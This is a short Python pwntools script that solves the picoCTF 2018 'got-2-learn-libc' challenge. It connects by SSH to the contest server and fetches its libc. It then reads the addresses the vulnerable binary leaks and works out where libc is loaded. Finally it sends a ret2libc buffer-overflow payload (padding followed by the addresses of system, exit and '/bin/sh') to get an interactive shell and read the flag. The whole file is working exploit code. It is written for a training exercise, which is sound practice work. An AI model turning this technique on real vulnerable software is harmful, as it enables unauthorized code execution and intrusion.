#!/usr/bin/python
from pwn import *
import os.path

USER = 'Platy' # Change username accordingly.

s = ssh(host='2018shell1.picoctf.com', user=USER) # Make sure ssh-keyz challenge is done first

if not os.path.isfile('./libc.so.6'):
	s.get('/lib32/libc.so.6')

# Set contexts
context(arch='i386', os='linux')

# Load libraries
libc = ELF("./libc.so.6")

libc_read_addr = libc.symbols['read']
libc_system_addr = libc.symbols['system']
libc_exit_addr = libc.symbols['exit']

py = s.run("cd /problems/got-2-learn-libc_3_6e9881e9ff61c814aafaf92921e88e33; ./vuln")
py.recvuntil('\n\n')

py.recvuntil(': ')
puts_addr = int(py.readline(), 16)

py.readuntil(' ')
fflush_addr = int(py.readline(), 16)

py.readuntil(': ')
read_addr = int(py.readline(), 16)

py.readuntil(': ')
write_addr = int(py.readline(), 16)

py.readuntil(': ')
binsh_addr = int(py.readline(), 16)
log.info("/bin/sh: {}".format(hex(binsh_addr))) 

# Calculate offset
libc_offset = read_addr - libc_read_addr

# Calculate libc offsets
system_addr = libc_system_addr + libc_offset
log.info("SYSTEM: {}".format(hex(system_addr))) 
exit_addr = libc_exit_addr + libc_offset
log.info("EXIT: {}".format(hex(exit_addr)))

# Build payload
padding = "A" * 160
exploit = padding + p32(system_addr) + p32(exit_addr) + p32(binsh_addr)

py.sendline(exploit)
py.sendline('echo; cat flag.txt; echo')
py.interactive()

# Close process
py.close()
